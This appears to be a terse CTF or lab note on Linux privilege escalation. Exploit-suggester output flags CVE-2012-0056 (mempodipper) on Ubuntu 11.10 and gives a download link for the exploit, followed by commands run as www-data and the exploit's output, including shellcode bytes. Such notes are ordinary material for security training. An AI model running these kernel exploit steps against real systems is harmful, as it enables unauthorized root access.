# 6 privesc KE

```
Available information:

Kernel version: 3.0.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 11.10
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
48 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2012-0056] memodipper

   Details: https://git.zx2c4.com/CVE-2012-0056/about/
   Exposure: highly probable
   Tags: [ ubuntu=(10.04|11.10){kernel:3.0.0-12-(generic|server)} ]
   Download URL: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c

# compilation issues on box but walkthrough shows this exploit only
www-data@ucal:/tmp/k$ gcc 18411.c -o 18411
gcc: error trying to exec 'cc1': execvp: No such file or directory

# running compiled binary
# https://github.com/lucyoa/kernel-exploits/tree/master/memodipper

www-data@ucal:/tmp/k$ ./memodipper64
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================

[+] Waiting for transferred fd in parent.
[+] Executing child from child fork.
[+] Opening parent mem /proc/1579/mem in child.
[+] Sending fd 4 to parent.
[+] Received fd at 6.
[+] Assigning fd 6 to stderr.
[+] Reading su for exit@plt.
[+] Resolved exit@plt to 0x4021d8.
[+] Calculating su padding.
[+] Seeking to offset 0x4021cc.
[+] Executing su with shellcode.
Unknown id: H1iH1j@@!H//bin/shSHH1f-iSHH1PQWHH1Ұ;
```
